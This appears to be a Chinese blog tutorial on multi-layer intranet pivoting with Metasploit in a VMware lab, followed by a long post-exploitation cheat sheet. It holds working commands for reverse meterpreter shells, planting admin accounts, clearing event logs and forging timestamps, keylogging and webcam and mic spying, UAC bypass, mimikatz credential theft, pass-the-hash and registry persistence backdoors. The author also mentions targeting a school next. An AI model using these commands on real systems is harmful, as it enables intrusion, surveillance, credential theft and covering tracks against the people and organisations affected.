---
title: msf多层内网穿透(基础篇)
mathjax: true
copyright: true
comment: true
date: 2019-10-28 21:54:31
tags: 工具使用
categories: 工具使用
---
先模拟多层内网，摸清后渗透的使用，再从学校入手。
内网渗透test

<!-- more -->

---
## 网络拓扑

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/B%60O%7E0%5BU%5DFA1.png)


以kali为攻击机，xp作为跳板主机，win7是内网主机

xp主机是提供web，FTP等服务，已被kali机获取shell

win7正常不与外网访问，和DMZ区域处于同一网段

## 环境搭建
使用VMware的主机模式，构建虚拟局域网。**查看[Host-only模式详解](https://cx-a.com/huamu/88.html)**

虚拟网络编译器中添加两块网卡vm1，vm2。 **类型**：主机模式
![](https://raw.githubusercontent.com/alpha302/cloudimg/master/%25X382%5DSO.png)

设置xp为双网卡vm1,vm2。其余按网络拓扑分配网卡

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/3%25%5BZ%7E%7B%7E73UK6VPP.png)

**查看ip**

kali
![](https://raw.githubusercontent.com/alpha302/cloudimg/master/SQ7%40K20%24P.png)

xp
![](https://raw.githubusercontent.com/alpha302/cloudimg/master/B%60SVVA_1NGSQ07.png)

win7
![](https://raw.githubusercontent.com/alpha302/cloudimg/master/%5BPF_T.png)

至此环境布置完毕

## 拿下跳板以及端口转发

以社工等方法获取到xp主机的shell
通过metasploit会话，使用Windows xp靶机作为跳板，扫描和攻击内部网络主机
```r
#kali msf
msf5 > use exploit/multi/handler 
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.252.128
lhost => 192.168.252.128
msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.252.128:4444 
[*] Sending stage (180291 bytes) to 192.168.252.130
[*] Meterpreter session 1 opened (192.168.252.128:4444 -> 192.168.252.130:1814) at 2019-11-16 12:44:58 +0800

meterpreter > ifconfig

Interface  1
============
Name         : MS TCP Loopback interface
Hardware MAC : 00:00:00:00:00:00
MTU          : 1520
IPv4 Address : 127.0.0.1


Interface  2
============
Name         : AMD PCNET Family PCI Ethernet Adapter - rface
Hardware MAC : 00:0c:29:dd:e6:94
MTU          : 1500
IPv4 Address : 192.168.85.129
IPv4 Netmask : 255.255.255.0


Interface  3
============
Name         : VMware Accelerated AMD PCNet Adapter - rface
Hardware MAC : 00:0c:29:dd:e6:9e
MTU          : 1500
IPv4 Address : 192.168.252.130
IPv4 Netmask : 255.255.255.0
```
可以看到xp是双网卡，发现另一内网段 192.168.85.0/24。

对该内网进行渗透
1. 添加内网的路由

    ```r
    meterpreter > run autoroute -s 192.168.85.0/24    #添加目标网段路由规则，获取内部网络访问通道
    meterpreter > route flush  #不用的时候,记得删掉就行
    ```
    ![](https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-16%2016-15-39%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png)

2. 扫描内网主机
    ```r
    meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.85.0/24 #arp扫描粗略的扫一眼目标内网的机器大概有多少
    ```
    发现 192.168.85.128的主机

    ![](https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-16%2016-30-27%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png)

3. socks代理
    ```r
    #利用sock4a模块对目标内网代理，只能负责tcp的流量，并不是socks代理进去以后就什么都能搞了
    meterpreter > background
    msf exploit(handler) > use auxiliary/server/socks4a 
    msf auxiliary(socks4a) > set srvhost 127.0.0.1
    msf auxiliary(socks4a) > set srvport 1111
    msf auxiliary(socks4a) > run
    ```
    ![](https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-16%2016-38-18%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png)

    在proxychians.conf中设置好代理,就可以对目标进行正常的内网渗透了
    ```R
    vi /etc/proxychains.conf
    #在文件末尾添加socks4代理服务器
    ```
    ![](https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-17%2019-01-22%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png)

    利用proxychains代理扫描并执行nmap操作
    ```r
    proxychains nmap -Pn -sT 192.168.85.0/24 -p1-100
    ```
    ![](https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-17%2020-25-22%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png)

    4. 发现存在80端口，google配置代理

    ![](https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-17%2020-17-29%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png)

    查看
    ![](https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-17%2021-00-09%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png)

## 获取内网win7的shell

1. 使用任意文件上传，获取路径
    
    ![](https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-17%2021-40-53%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png)

2. 这里使用蚁剑连接
   
   ![](https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-17%2021-40-01%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png)

3. 可以看到win7 开启了3389端口
   ![](https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-17%2021-44-11%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png)

4. 这里开启并使用远程桌面
   
   ```r
   # 创建新的管理员账户(直接更改管理员密码 net user Administrator 123)
   whoami
   net user
   net user wk 123 /add
   net localgroup administrators wk /add   #wk加入管理员账户
   
   # 使用远程桌面
   portfwd add -l 2222 -p 3389 -r 127.0.0.1  #先将3389流量转发到代理服务器
   rdesktop 127.0.0.1:2222     #kali自带rdesktop
   
   
   ```
    ![权限为系统权限](https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-17%2022-02-50%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png)

    ![](https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-17%2022-00-42%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png)

    ![](https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-17%2022-08-53%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png)

    我这里出现错误，下载的win 7的系统有问题，但是此时的用户是正常使用的。
    ![](https://raw.githubusercontent.com/alpha302/cloudimg/master/%25IU1.png)

    ![](https://raw.githubusercontent.com/alpha302/cloudimg/master/%25%24FXJE5F5.png)

    到此时，接下来的操作大家都懂的！

## 常用命令总结

#### execute执行文件

```r
execute #在目标机中执行文件
execute -H -i -f  cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互
execute -H -m -d notepad.exe -f payload.exe -a "-o hack.txt"
# -d 在目标主机执行时显示的进程名称（用以伪装）-m 直接从内存中执行
"-o hack.txt"是payload.exe的运行参数
```

#### migrate进程迁移

```r
getpid    # 获取当前进程的pid
ps   # 查看当前活跃进程
migrate <pid值>    # 将Meterpreter会话移植到指定pid值进程中
kill <pid值>   # 杀死进程
```
#### clearev清除日志
```R
clearev  # 清除windows中的应用程序日志、系统日志、安全日志
```
#### timestomp伪造时间戳
```r
timestomp C:\\ -h   #查看帮助
timestomp -v C:\\2.txt   #查看时间戳
timestomp C:\\2.txt -f C:\\1.txt #将1.txt的时间戳复制给2.txt
timestomp  c:\\test\\22.txt -z "03/10/2019 11:55:55" -v # 把四个属性设置为统一时间
```

#### portfwd端口转发
```r
portfwd add -l 1111 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地1111端口
rdesktop 127.0.0.1:1111 # 需要输入用户名密码连接
rdesktop -u Administrator -p 123 127.0.0.1:1111 # -u 用户名 -p 密码
```

#### autoroute添加路由
```R
run autoroute -h # 查看帮助
run get_local_subnets # 查看目标内网网段地址
run autoroute -s 192.168.183.0/24  # 添加目标网段路由
run autoroute -p  # 查看添加的路由
```
#### 利用arp_scanner、portscan等进行扫描
```R
run post/windows/gather/arp_scanner RHOSTS=192.168.183.0/24
run auxiliary/scanner/portscan/tcp RHOSTS=192.168.183.146 PORTS=3389
```

#### Socks代理
```R
use auxiliary/server/socks4a
set srvhost 127.0.0.1
set srvport 2000
run
# 然后vim /etc/proxychains.conf ，在文件末尾添加socks4代理服务器
socks4 127.0.0.1 2000
proxychains nmap -Pn -sT 192.168.80.129 -p1-1000   #proxychains代理访问执行nmap操作
```
#### 键盘记录
```R
keyscan_start  # 开始键盘记录
keyscan_dump   # 导出记录数据
keyscan_stop   # 结束键盘记录
```
#### 网络摄像头
```R
record_mic　 # 音频录制
webcam_chat  # 开启视频聊天(对方有弹窗）
webcam_list  # 查看摄像头
webcam_snap  # 通过摄像头拍照
webcam_stream  # 通过摄像头开启视频监控(以网页形式进行监控≈直播）
```
#### 截屏
```R
screenshot  # 截屏
use espia  # 使用espia模块
screengrab  # 截屏
```
#### 绕过UAC提权 
msf内置一些bypassuac脚本，原理不同，使用方法类似，执行后返回一个新的会话，执行getsystem即可提权
```R
exploit/windows/local/bypassuac
exploit/windows/local/bypassuac_eventvwr
exploit/windows/local/bypassuac_injection
exploit/windows/local/bypassuac_injection_winsxs
exploit/windows/local/bypassuac_silentcleanup
exploit/windows/local/bypassuac_vbs

use exploit/windows/local/bypassuac
set session 1
run
getsystem
```

#### 窃取hash及密码&哈希传递
```R
# 窃取hash及密码
hashdump
run post/windows/gather/smart_hashdump
得到的hash可以拿去https://cmd5.com/ 解密一下即是用户密码


#mimikatz
load mimikatz # 加载mimikatz模块
msv  # 获取用户和hash值 
kerberos  # 获取内存中的明文密码信息
wdigest  # 获取内存中的明文密码信息
mimikatz_command -f a:: # 需要以错误的模块来让正确的模块显示
mimikatz_command -f sekurlsa::searchPasswords # 获取用户密码
mimikatz_command -f samdump::hashes  # 执行用户hash

#哈希传递
#利用hashdump得到用户的hash后可利用psexec模块进行哈希传递攻击。
使用psexec的前提：SMB服务必须开启，也就是开启445端口；Admin$可以访问
use exploit/windows/smb/psexec
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.183.147
set LPORT 443
set RHOST 192.168.183.154
set SMBUSER Administrator
set SMBPASS ccf**4ee:3db**678
set SMBDOMAIN  WORKGROUP   # 域用户需要设置SMBDOMAIN
run
```
#### RDP
```R
#getgui命令
#这里需要注意的是通过getgui命令，虽然可以成功添加用户，但是没有权限远程登录桌面，这里推荐使用enable_rdp脚本添加。
run getgui –h  # 查看帮助
run getgui -e  # 开启远程桌面
run getgui -u admin -p admin  # 添加用户
run getgui -f 6666 -e  # 3389端口转发到6666


#enable_rdp脚本
#通过enable_rdp脚本将用户添加到远程桌面用户组和管理员用户组
run post/windows/manage/enable_rdp  #开启远程桌面
run post/windows/manage/enable_rdp USERNAME=admin PASSWORD=admin # 添加用户
run post/windows/manage/enable_rdp FORWARD=true LPORT=6667  # 将3389端口转发到6667

#远程桌面
enumdesktops  # 查看可用的桌面
getdesktop    # 获取当前meterpreter 关联的桌面
setdesktop    # 设置meterpreter关联的桌面  -h查看帮助
run vnc   # 使用vnc远程桌面连接
rdesktop 127.0.0.1:1111 # 需要输入用户名密码连接
rdesktop -u Administrator -p 123 127.0.0.1:1111 # -u 用户名 -p 密码

```
#### 后门植入
```R
# Persistence(通过启动项安装)
run persistence –h  # 查看帮助
run persistence -X -i 5 -p 4444 -r 192.168.183.147 
run persistence -U -i 5 -p 4444 -r 192.168.183.147 -L c:\\Windows\\System32
-X：设置后门在系统启动后自启动。该方式会在HKLM\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。由于权限原因会导致添加失败，后门无法启动。因此在非管理员权限下，不推荐使用该参数
-U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息
-L：后门传到远程主机的位置默认为%TEMP%
-i：设置反向连接间隔时间为5秒
-p：设置反向连接的端口号
-r：设置反向连接的ip地址

```